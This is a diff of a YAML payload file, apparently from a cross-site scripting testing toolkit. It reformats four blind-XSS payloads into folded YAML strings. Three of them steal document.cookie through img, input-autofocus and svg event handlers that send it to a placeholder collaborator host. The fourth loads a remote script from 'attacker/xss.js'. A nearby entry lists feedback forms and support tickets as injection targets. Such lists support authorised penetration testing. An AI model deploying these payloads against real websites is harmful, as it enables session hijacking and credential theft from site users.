@@ -44,10 +44,14 @@ payloads:
     - jquery_html: "$('#div').html(userInput)"
 
   blind_xss:
-    - basic: '"><img src=x onerror="new Image().src=\'https://COLLAB/?c=\'+document.cookie">'
-    - script_remote: '"><script src="https://attacker/xss.js"></script>'
-    - input_autofocus: '"><input onfocus="fetch(\'https://COLLAB/?c=\'+document.cookie)" autofocus>'
-    - svg_style: '<svg><style><img src=x onerror="fetch(\'https://COLLAB/?s=\'+document.cookie)">'
+    - basic: >
+        "><img src=x onerror="new Image().src='https://COLLAB/?c='+document.cookie">
+    - script_remote: >
+        "><script src="https://attacker/xss.js"></script>
+    - input_autofocus: >
+        "><input onfocus="fetch('https://COLLAB/?c='+document.cookie)" autofocus>
+    - svg_style: >
+        <svg><style><img src=x onerror="fetch('https://COLLAB/?s='+document.cookie)">
 
   blind_targets:
     - "反馈表单/支持工单"
